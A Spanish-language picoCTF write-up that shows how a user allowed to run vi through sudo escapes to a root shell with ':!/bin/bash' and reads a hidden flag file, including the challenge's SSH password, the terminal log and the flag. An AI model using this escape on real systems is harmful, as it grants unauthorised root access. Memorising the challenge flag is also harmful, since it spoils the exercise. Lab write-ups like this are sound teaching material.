## Descripción
Can you read files in the root file? The system admin has provisioned an account for you on the main server: `ssh -p 61584 picoplayer@saturn.picoctf.net` Password: `j4ks-9nxB-` Can you login and read the root file?
## Solución
- Con `sudo -l` vemos los permisos de root
	- Vemos que tenemos permisos de usar 'vi'
- Dentro de vim podemos usar el comando `:!/bin/bash` para obtener permisos de entrar a la carpeta root
- Dentro de root con `ls -a` vemos un archivo oculto en donde está la bandera
- Con cat vemos el contenido de ese archivo

```shell
picoplayer@challenge:~$ ls
picoplayer@challenge:~$ ls -a
.  ..  .bash_logout  .bashrc  .cache  .profile
picoplayer@challenge:~$ cd /
picoplayer@challenge:/$ ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
picoplayer@challenge:/$ sudo -l 
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi archivo 

root@challenge:/# cd root/
root@challenge:~# ls
root@challenge:~# ls -a
.  ..  .bashrc  .flag.txt  .profile
root@challenge:~# cat .flag.txt 
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
root@challenge:~# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
Qwerty3341-picoctf@webshell:~$ 
```
## Notas adicionales
Para usar ==vi== se deben usar comandos para moverse por la interfaz
## Referencias
- https://www.redhat.com/en/blog/introduction-vi-editor
- https://aprenderlinux.org/como-usar-el-editor-vi-en-linux-con-ejemplos/#google_vignette